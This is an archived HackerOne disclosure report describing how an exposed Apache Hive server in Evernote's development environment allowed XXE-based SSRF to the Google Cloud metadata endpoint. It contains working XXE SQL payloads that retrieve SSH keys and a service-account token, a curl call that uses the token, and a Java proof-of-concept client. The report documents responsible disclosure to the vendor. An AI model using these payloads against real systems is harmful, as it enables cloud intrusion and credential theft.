---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/xml-external-entities-xxe
  - env/web
substate: "resolved"
weakness: "XML External Entities (XXE)"
enriched: true
body: true
date: 2020-10-27
submitted: 2019-11-21T00:27:31.178Z
bounty_usd: null
votes: 25
cve: []
program: "[[programs/evernote|Evernote]]"
reporter: "kaulse"
source: "https://hackerone.com/reports/742808"
title: "Non-production Open Database In Combination With XXE Leads To SSRF"
---
# Non-production Open Database In Combination With XXE Leads To SSRF

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 25 | **Program:** Evernote | **Disclosed:** 2020-10-27

- Report: [https://hackerone.com/reports/742808](https://hackerone.com/reports/742808)
- CWE: XML External Entities (XXE)
- Submitted: 2019-11-21T00:27:31.178Z

## Report summary

Due to a misconfigured database, it was possible to access Evernote's Google Cloud account which had access permissions to the Google Cloud products BigQuery, BigTable and Google Cloud Storage. Hence, the severity is critical.
The report is out of scope for the BBP program as it's on Evernote's developer environment instead of the production one.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
The Apache Hive database hosted on the IP ██████████ and open on port 10000 is open and vulnerable to XXE.
By "open", I mean that the database can be accessed by anyone.

## Steps To Reproduce:
Chose any database client that supports Apache Hive and also uses a specific client version. "Specific client version" because you will otherwise get an error which looks like this:
```
13:22:26.077 [main] ERROR org.apache.hive.jdbc.HiveConnection - Error opening session
org.apache.hive.org.apache.thrift.TApplicationException: Required field 'client_protocol' is unset! Struct:TOpenSessionReq(client_protocol:null, configuration:{set:hiveconf:hive.server2.thrift.resultset.default.fetch.size=1000, use:database=default})
```
  1. Chose a database client and connect to mentioned IP and port
  2. Execute the following SQL payload:

```SQL
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/project-id"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```
The query above will return the associated project id which is "en-development".

## Supporting Material/References:
I will list some interesting information that I queried below.

**Query**
```SQL
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```
**Response**
```
████
█████
██████████
█████████
██████
██████████
██████
████████
████
████
████████
███████
█████████
███████
██████
█████
███
███
████
████████
██████
█████████
███████
██████████
█████████
████
█████████
████
██████████
█████
██████████
█████
████████
██████████
██████
██████████
█████
█████
██████
██████████
█████
███
████
```

## Impact

Access to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.

## Timeline

- **Report Filed**
- **2019-11-21** @kaulse: See attached files for information regarding Google Cloud Storage.
- **2019-11-21** @kaulse: I bet that you will have problems reproducing the vulnerability at the beginning.
Here a picture of my database client, DataGrip from Jetbrains:
████
I "compiled" my own database driver for this Apache Hive server version and added my own driver as a new driver to DataGrip which looks like this:
█████

In addition to this, I can also create a POC by giving you a step by step tutorial for a java POC which you would need to compile.
- **2019-11-21** @kaulse: I fetched a service account bearer token using the following command:
```
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5;
```
Which gave the following result:
```JSON
{
  "access_token": "███",
  "expires_in": 2765,
  "token_type": "Bearer"
}
```
The token above has the following privileges (v1beta1/instance/service-accounts/default/scopes):
```
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/bigtable.admin.table
https://www.googleapis.com/auth/bigtable.data
https://www.googleapis.com/auth/cloud.useraccounts.readonly
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/logging.write
```


By using the fetched access token, you can now query the Google Cloud APIs where the Google Cloud service account has access.
Here an example:
```
TOKEN="████████"
curl https://www.googleapis.com/bigquery/v2/projects  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json"
```
->
```
{
  "kind": "bigquery#projectList",
  "etag": "q2ON3ZLAMBY8/tPzXXY9mQ==",
  "projects": [
    {
      "kind": "bigquery#project",
      "id": "en-development",
      "numericId": "781002931567",
      "projectReference": {
        "projectId": "en-development"
      },
      "friendlyName": "en-development"
    },
    {
      "kind": "bigquery#project",
      "id": "en-testing",
      "numericId": "688474802891",
      "projectReference": {
        "projectId": "en-testing"
      },
      "friendlyName": "en-testing"
    },
    {
      "kind": "bigquery#project",
      "id": "sf6fb9ce958be8d9d-tp",
      "numericId": "29280230642",
      "projectReference": {
        "projectId": "sf6fb9ce958be8d9d-tp"
      },
      "friendlyName": "sf6fb9ce958be8d9d-tp"
    }
  ],
  "totalItems": 3
}
```

I have attached a list of all datasets in Google BigQuery/BigTable in the project "en-development" ███████
- **2019-11-21** @kaulse: You can build your own POC like this:
1. First you need the right driver. I personally prefer to use some automatic build process so you don't have to worry about getting infected. I mean, if I would not give you this option you would very likely need to trust my jar files which is not a great option. You can copy the following text or download it ███████.

```
apply plugin: 'java'

dependencies {
  runtime group: 'org.apache.hive', name: 'hive-jdbc', version: '1.1.0'
  runtime group: 'org.apache.hadoop', name: 'hadoop-client', version: '1.1.0'
}

repositories { mavenCentral() }

task getDeps(type: Copy) {
  from sourceSets.main.runtimeClasspath
  into 'runtime/'
}
```
2. Execute the command `gradle getDeps`. It will create a new directory and download all kind of files that the driver requires. This should look like this:
██████
3. Create a new POC file called `QueryHive.java`. Copy or download it ████████:

```JAVA
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;
import java.sql.Statement;

public class QueryHive {
    private static String driverName = "org.apache.hive.jdbc.HiveDriver";
    public static void main(String[] args) throws SQLException {
        try {
            Class.forName(driverName);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            System.exit(1);
        }
        Connection conn = DriverManager.getConnection("jdbc:hive2://" + args[0], "hive", "");
        Statement stmt = conn.createStatement();

        ResultSet rs = stmt.executeQuery(args[1]);
        while (rs.next()) {
            System.out.println(rs.getString(1));
        }
        rs.close();

        conn.close();
     }
}
```
4.  Compile the `QueryHive.java` file like this:
```
javac QueryHive.java
```
You will notice a new file in your folder called QueryHive.class
5. Execute the QueryHive.class file with java by using your new driver:
```
java -classpath '.:./runtime/*' QueryHive ████████:10000 "SELECT 1"
```
You will notice that the first argument after the class name is the IP and PORT. The second argument is the SQL query.
Here another example:

```
➜  tut CMD=$(cat cmd.sql)
➜  tut echo $CMD
select xpath_string('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/"> ]><stockCheck>&xxe;</stockCheck>', '*') FROM test LIMIT 5

➜  tut java -classpath '.:./runtime/*' QueryHive ██████:10000 $CMD
19/11/21 02:12:39 INFO jdbc.Utils: Supplied authorities: ████████:10000
19/11/21 02:12:39 INFO jdbc.Utils: Resolved authority: ██████████:10000
19/11/21 02:12:39 INFO jdbc.HiveConnection: Will try to open client transport with JDBC Uri: jdbc:hive2://█████:10000
781002931567-compute@developer.gserviceaccount.com/
default/
```
- **2019-11-21** @xwuevernote: Thanks, @kaulse

We can confirm this is a valid report and are working on resolving it now. This is a developer project in our Google Cloud environment.

Best Regards,
Evernote Security
- **Report Triaged**
- **2019-12-02** @kaulse: Hey @xwuevernote,

Thank you for taking the time to resolve this vulnerability. May I ask if you have any news for me?
I am asking, since I have submitted this vulnerability 12 days ago and I have seen that I cannot reach the target anymore. I conclude that someone took the right steps to remediate this vulnerability.

Thanks in advance!
Best Regards,
Sebastien
- **Report Resolved**
- **2019-12-02** @kaulse: Cool. Is it possible to claim a monetary reward for this report? If so, I should make things easy by reporting the same vulnerability via your BBP program right?
- **2019-12-02** @xwuevernote: Unfortunately, this particular issue you reported is out of scope for our BBP program as it's on a developer environment instead of our production one.

Regards,
Xiaoyong
- **Agreed On Going Public**
- **Report Title Updated**
- **2020-10-23** @kaulse: Please redact everything in the report except my summary and the report's title.
- **Agreed On Going Public**
- **Report Became Public**
- **Reassigned To Team**
